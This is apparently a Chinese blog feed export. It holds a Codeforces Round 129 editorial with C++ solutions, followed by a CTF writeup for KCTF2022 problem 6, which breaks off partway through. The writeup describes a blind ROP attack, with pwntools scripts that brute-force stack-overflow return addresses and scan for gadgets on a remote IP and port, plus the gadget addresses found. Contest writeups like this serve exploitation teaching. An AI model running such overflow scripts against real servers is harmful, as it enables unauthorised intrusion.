&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alice\nBob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Card-Trick"><a href="#B-Card-Trick" class="headerlink" title="B. Card Trick"></a>B. Card Trick</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/24/Educational%20Coeforces%20Round%20129(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>一个以前经常玩的魔术，就是假装洗牌，实则那张牌在哪里记得清清楚楚。给一个序列，每次操作会把前 <code>k</code> 个值移动到最后去。问经过若干次操作之后第一个牌的值是多少，不难发现如果进行一次操作相当于第 <code>k+1</code> 张牌会变成第一张牌，因为是直接移动，不改变顺序，所以不难想到改题目就是统计所有的操作次数最后对 <code>n</code> 取模得到的下标就是第一张牌的位置。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x,op,ans=<span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cin&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=x;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;op);</span><br><span class="line">        ans+=op;</span><br><span class="line">        ans%=n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a[ans+<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Double-Sort"><a href="#C-Double-Sort" class="headerlink" title="C. Double Sort"></a>C. Double Sort</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/24/Educational%20Coeforces%20Round%20129(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>给两个序列，每次一起交换，问最后能否交换成都不递减，且若能则输出交换次数最少的方案。我们直接定义结构体存储两个序列的值再重载小于号，让它严格按 <code>a</code> 递增，相等的情况按 <code>b</code>递增，因为交换次数最少，不难想到用选择排序可以达到交换次数最少的目的。那么我们就先排个序，然后判断 <code>b</code> 的值是否不递减就可以了。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//int a[maxn];</span></span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">in</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//    scanf(&quot;%d%d&quot;,&amp;a,&amp;b);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(<span class="keyword">const</span> A &amp;q)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a==q.a)&#123;</span><br><span class="line">            <span class="keyword">return</span> b&lt;q.b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a&lt;q.a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;a[maxn]; </span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;ans;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;().<span class="built_in">swap</span>(ans);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i].a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i].b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> idx=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[idx])&#123;</span><br><span class="line">                idx=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(idx!=i)&#123;</span><br><span class="line">            ans.<span class="built_in">push</span>(&#123;idx,i&#125;);</span><br><span class="line">            <span class="built_in">swap</span>(a[i],a[idx]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i<span class="number">-1</span>].b&gt;a[i].b)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">while</span>(ans.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> x=ans.<span class="built_in">front</span>();</span><br><span class="line">        ans.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,x.first,x.second);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Colorful-Stamp"><a href="#D-Colorful-Stamp" class="headerlink" title="D. Colorful Stamp"></a>D. Colorful Stamp</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/24/Educational%20Coeforces%20Round%20129(Div.2)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>这个题，就是说对一个数进行操作，每次可以把这个数的十进制某一位作为乘数乘这个数，即为一次操作。问你最小操作次数使这个数变成十进制 <code>n</code> 位。</p><p>这个题的话就直接无脑广搜就好了。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int unsigned long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> target=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">40</span>;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    q.<span class="built_in">push</span>(&#123;now,<span class="number">0</span>&#125;);</span><br><span class="line">    <span class="keyword">bool</span> used[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        cnt++;</span><br><span class="line">        <span class="built_in">memset</span>(used,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(used));</span><br><span class="line">        <span class="keyword">int</span> num=q.<span class="built_in">front</span>().first;</span><br><span class="line">        <span class="keyword">int</span> step=q.<span class="built_in">front</span>().second;</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">int</span> m=num;</span><br><span class="line">        <span class="keyword">if</span>(num&gt;=target)&#123;</span><br><span class="line">            <span class="comment">//printf(&quot;%lld\n&quot;,cnt);</span></span><br><span class="line">            <span class="keyword">return</span> step;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(m)&#123;</span><br><span class="line">            <span class="keyword">int</span> p=m%<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>(p!=<span class="number">0</span>&amp;&amp;p!=<span class="number">1</span>&amp;&amp;!used[p])&#123;</span><br><span class="line">                used[p]=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(ma[p*num]==<span class="number">1</span>)<span class="keyword">continue</span>;</span><br><span class="line">                ma[p*num]=<span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(&#123;p*num,step+<span class="number">1</span>&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            m/=<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    target=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        target*=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="built_in">bfs</span>(x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="In-The-End"><a href="#In-The-End" class="headerlink" title="In The End"></a>In The End</h2><p>这波应该是手速场，手速快就是上大分，继上一次罚时爆炸之后这场没有一点罚时，挺好的，刚刚掉蓝一下给加回来了。</p><p><img src="/2022/05/24/Educational%20Coeforces%20Round%20129(Div.2)/5.png" alt="5"></p><p><img src="/2022/05/24/Educational%20Coeforces%20Round%20129(Div.2)/6.png" alt="6"></p><p>100分！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这波 &lt;code&gt;div2&lt;/code&gt; 上大分，写波题解。&lt;/p&gt;
&lt;p&gt;实况录屏&lt;a href=&quot;https://www.bilibili.com/video/BV1RS4y1B7g3&quot;&gt;在这&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>KCTF2022春季赛 第六题 writeup</title>
    <link href="http://example.com/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/"/>
    <id>http://example.com/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/</id>
    <published>2022-05-23T04:00:00.000Z</published>
    <updated>2022-05-23T09:30:23.608Z</updated>
    
    <content type="html"><![CDATA[<p>KCTF2022春季赛 第六题 writeup</p><span id="more"></span><p>这题，BROP提示给的很明显，所以就是盲打，不管怎么说先问(bao)候(da)一下出题人。</p><p>首先我们一开始什么都不知道，就先确定一下一些基本信息，那么就先测试一下缓冲区的长度，最后发现缓冲区长度为0x10。</p><p>我们先执行一遍正常流程，大概就是：</p><ol><li>输出一句话</li><li>输入</li><li>输出一句话</li></ol><p>当存在栈溢出的时候，最后一句话输出不出来，因此可以断定，溢出是发生在自己定义的函数的。大概写一下伪代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void func()&#123;</span><br><span class="line">char buf[16];</span><br><span class="line">gets(buf);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">puts(&quot;hacker, TNT!&quot;);</span><br><span class="line">func();</span><br><span class="line">puts(&quot;TNT TNT!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，输出第一句话的语句可能也在 <code>func</code> 里面，但是不影响，我们先爆破第一个字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10100</span>)</span><br><span class="line">        s=p.recvline()</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p8(i)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        ss=(p.recvline(timeout=<span class="number">1</span>))</span><br><span class="line">        <span class="built_in">print</span>(ss)</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/1.png" alt="1"></p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/2.png" alt="2"></p><p>可以发现，当覆盖一个 <code>\xb0</code> 字节的时候，程序重新执行了一遍 <code>main</code> 函数，当覆盖一个 <code>\xce</code> 字节的时候，程序执行正常流程退出了，那么我们可以得出以下信息：</p><ul><li><code>main</code> 函数的低位为 <code>0xb0</code></li><li><code>func</code> 函数的返回地址为 <code>0xce</code></li></ul><p>这里其实可以确定输出第一句话的函数在 <code>main</code> 当中了，因为如果在 <code>func</code> 函数当中，那么一定会存在两个地址使得程序重新执行一遍流程，那就是改成了 <code>func</code> 函数和 <code>main</code> 函数的地址都会这样，没有就说明第一句话输出不在 <code>main</code> 当中。</p><p>然后再勇敢地一试，猜测它的地址为 <code>0x4000b0</code>，结果发现也是重新执行了 <code>main</code> 函数，这也间接断定了这个程序是 <code>64</code> 位的。上面推出的两个地址也确定了。</p><p>接下来，就可以尝试取寻找 <code>gadget</code> 了，我们要寻找的首要 <code>gadget</code> 自然就是 <code>pop rdi ret</code> 了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b0</span></span><br><span class="line">ret=<span class="number">0x4000ce</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400000</span>,<span class="number">0x401900</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10100</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        s=p.recvline()</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(i)+p64(ret)+p64(main)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        ss=(p.recvline(timeout=<span class="number">1</span>))</span><br><span class="line">        <span class="built_in">print</span>(ss)</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>在这个 <code>payload</code> 当中，可以发现，如果寻找的 <code>gadget</code> 为 <code>ret</code>，那么则会继续流程，如果 <code>gadget</code> 类似于 <code>pop xxx ret</code> 的话则会重新执行 <code>main</code> 函数。结果 <code>ret</code> 找到了很多，其它的 <code>gadget</code> 愣是没找到一个，于是决定往后面再加一个 <code>p64(main)</code>，结果居然找到了七个地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a0x4000f5 pop xxx *2;ret</span><br><span class="line">0x4000fa pop xxx *2;ret</span><br><span class="line">0x4000fb pop xxx *2;ret</span><br><span class="line">0x4000fd pop xxx *2;ret</span><br><span class="line">0x4000fe pop xxx *2;ret</span><br><span class="line">0x400100 pop xxx *2;ret</span><br><span class="line">0x400101 ret</span><br><span class="line">0x400102 pop xxx *2 ; ret</span><br><span class="line">0x400106 ret</span><br></pre></td></tr></table></figure><p>然后我尝试取寻找它的 <code>IO</code> 函数去输出它的 <code>got</code> 表，但是测了很多地址都没有发现有输出 <code>\n</code> 字节，这里也排除它用 <code>puts</code> 函数输出的可能，但是它可能也用了 <code>printf</code> 或者是 <code>write</code> 函数之类的，但是我还是往 <code>printf</code> 去想而没有往 <code>write</code> 去想。然后我就拿那些 <code>gadget</code> 试着传参看看，结果不出意外都失败了，无任何回显。</p><p>这里我困扰了很久，后来我们队的 <code>ThTsOd</code> 师傅给了我一个很重要的思路，那就是</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/3.png" alt="3"></p><p>再来看看精致得分的规则：</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/4.png" alt="4"></p><p>直接拉满了那就很能说明问题了，肯定是甚至没有 <code>plt</code> 或者 <code>got</code> 表的那种文件，直接用的 <code>syscall</code> 才能有这么小的长度。</p><p>这里借用以下 <code>ThTsOd</code> 师傅的脚本，帮我们确定了一些 <code>syscall</code> 的位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">context.log_level=<span 